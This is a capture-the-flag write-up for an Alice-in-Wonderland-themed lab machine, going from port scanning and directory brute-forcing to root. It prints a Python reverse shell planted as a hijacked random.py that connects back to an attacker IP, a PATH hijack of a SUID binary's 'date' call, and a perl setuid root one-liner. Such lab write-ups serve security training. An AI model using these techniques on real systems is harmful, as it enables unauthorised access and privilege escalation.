
We start by enumerating the target machine with rustscan:

	rustscan -a 10.10.43.9

output:

	ports	service
	22		ssh
	80		http

we visite the website and we run feroxbuster in the background:

	sudo feroxbuster -u http://10.10.43.9/ -w /usr/share/worldist/dirbuster/dir-list-medium  -x php,txt,json,docx,pdf,js,html,git,bak -t 50 -d 1

output:

	/img
	/r

there are also some images to downloads but they are just rabbit holes to distract you.
the /r seems very strange so we keep digging in the rabbit hole (as the machine is theamed) so we keep enum the directory:

	/a
	/b
	...
we identify a pattern like this:

	http://10.10.43.9/r/a/b/b/i/t/

at the end we find an html file with a user and a password in the source code:

	alice:REDACTED

we can try those creds in but first we open a pwncat:

	python3 -m pwncat  
	connect ssh://alice:REDACTED@10.10.43.9

we find a root.txt (very strange things) in alice /home directory but off course we cant "cat" it so we need to keep digging:
i tried to see alice permissions with:

	sudo -l

output:

	(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 

this means that we can run the script in alice's /home dir; in the script its imported the random library; maybe we can try to fake the library with one of our script so the user rabbit can execute our rev shell:

	random.py

	import sys
	import socket
	import os
	import pty

	def choice(d):
			s=socket.socket();s.connect(("10.8.9.143",int(3333)));
			[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
			pty.spawn("/bin/bash")
			return "ciao"

with this script we get a call back to our pwncat:

	python3 -m pwncat
	connect -lp 3333

we got the rabbit shell.
inside rabbit's home directory we find a teaParty, its an ELF with suid bit on, we analyze the ELF on ghidra and we se this:

	setuid(0x3eb);
	setgid(0x3eb);
	puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
	system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
	puts("Ask very nicely, and I will give you some tea while you wait for him");
	getchar();
	puts("Segmentation fault (core dumped)");
	return;

the script print the date dinamically by calling the "date" binary, so we can change the $PATH env variable so we can create our own date file to execute as hatter, the next user:

	export PATH=/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

now we create the date file and mark it as executable:

	echo "/bin/bash" > date
	chmod +x date

now we can run the script and get a shell with hatter:

	./teaParty

Now we are hatter and we can try launch linpeas.sh to enumerate hatter privilage:
we find perl suid so we can execute perl rev shell

	perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

now we are root and we can cat the root.txt that is in the root folder and then we go to /root directory and we retrieve the user.txt.
